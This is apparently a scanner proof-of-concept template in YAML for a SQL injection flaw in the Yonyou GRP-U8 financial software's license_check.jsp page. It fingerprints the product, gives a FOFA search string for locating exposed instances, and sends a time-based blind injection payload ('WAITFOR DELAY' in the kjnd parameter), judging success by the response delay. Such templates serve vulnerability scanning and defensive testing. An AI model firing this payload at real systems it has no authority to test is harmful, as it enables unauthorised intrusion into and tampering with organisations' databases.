id: poc-yaml-yongyou-grp-u8-license-check-jsp-sqli
info:
  name: 用友GRP-U8 license_check.jsp SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: GRP-U8
  fofa: app="用友-GRP-U8"
variables:
  t1: random_int(5,10)
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(body,"GRP-U8")
- method: GET
  path: /u8qx/license_check.jsp?kjnd=%27WAITFOR+DELAY%270:0:{{.t1}}%27--+
  expression: status_code == 200 && contains(body,"1") && duration >= t1 && duration
    < 11
transport: http
